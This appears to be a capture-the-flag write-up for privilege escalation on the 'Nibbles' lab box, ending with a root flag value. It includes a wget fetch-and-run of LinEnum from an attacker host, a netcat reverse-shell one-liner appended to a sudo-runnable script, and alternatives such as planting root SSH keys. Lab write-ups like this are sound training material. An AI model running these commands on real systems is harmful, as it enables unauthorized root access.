- **Objective**: Escalate from `nibbler` to `root` on Nibbles.
- **Loot & clue**
    - Unzip: `unzip personal.zip` → `personal/stuff/monitor.sh` (owned by `nibbler`, **writable**).
    - Keep note, but enumerate more first.
- **Automated enum (LinEnum)**
    - Host a quick server on attacker: `sudo python3 -m http.server 8080` (where `LinEnum.sh` is).
    - On target: `wget http://<ATTACKER_IP>:8080/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh`
    - Finding: **Passwordless sudo** for `nibbler` on a specific file:
        ```
        (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
        ```
- **Exploit path: writable script + sudo**
    1. **Backup** the script (avoid breaking legit behavior):
        ```bash
        cp /home/nibbler/personal/stuff/monitor.sh /home/nibbler/personal/stuff/monitor.sh.bak
        ```
    2. **Append** a root reverse shell one-liner (choose your IP/port):
        ```bash
        echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f' \
          | tee -a /home/nibbler/personal/stuff/monitor.sh
        ```
    3. On attacker, **start listener**:
        ```bash
        nc -lvnp 8443
        ```
    4. **Trigger with sudo** (no password needed):
        ```bash
        sudo /home/nibbler/personal/stuff/monitor.sh
        ```
    5. Catch shell → verify root: `id` → `uid=0(root)`.
- **Post-esc actions**
    - Read flags: `/home/nibbler/user.txt` and `/root/root.txt`.
    - (Optional) Upgrade TTY if needed (on reverse shell):
        ```bash
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        ```
    - **Clean up**: restore original script, remove artifacts (`monitor.sh` appended payload, temp files in `/tmp`).
- **Why this works**
    - `sudoers` grants root execution of a **writable** script → you control what runs as root.
- **Alternatives to know**
    - If netcat not available: use bash TCP, python3 `socket` reverse shell, or write a simple SUID-dropper (only if policy allows and you clean up).
    - If outbound blocked: consider **local root read** (e.g., add SSH key to `/root/.ssh/authorized_keys`) or run `bash -p` if SUID bit is leveraged.
- **Good practice**
    - Always append, don’t overwrite; keep backups.
    - Timestamp notes and commands for reproducibility.
    - Remove your changes before exiting.


# Questions
- Escalate privileges and submit the root.txt flag.
	- Root.txt flag: de5e5d6619862a8aa5b9b212314e0cdd